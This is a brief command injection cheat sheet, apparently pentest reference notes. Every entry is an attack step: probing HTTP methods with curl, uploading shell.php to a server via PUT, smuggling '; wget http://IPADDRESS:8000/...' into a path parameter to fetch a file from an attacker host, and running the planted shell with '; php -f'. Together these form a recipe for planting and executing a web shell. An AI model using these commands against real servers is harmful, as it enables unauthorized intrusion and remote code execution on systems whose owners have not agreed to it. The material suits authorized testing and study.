# 💉 Command Injection Cheat Sheet

#### **File Traverse:**

* ```
  website.com/file.php[?path=/]
  ```

#### **Test HTTP options using curl:** <a href="#toc475369021" id="toc475369021"></a>

* ```
  curl -vX OPTIONS [website]
  ```

#### **Upload file using CURL to website with PUT option available** <a href="#toc475369022" id="toc475369022"></a>

* ```
  curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0
  ```

#### **Transfer file** (Try temp directory if not writable)(wget -O tells it where to store): <a href="#toc475369023" id="toc475369023"></a>

* ```
  ?path=/; wget http://IPADDRESS:8000/FILENAME.EXTENTION;
  ```

#### **Activate shell file:** <a href="#toc475369024" id="toc475369024"></a>

* ```
  ; php -f filelocation.php;
  ```

\
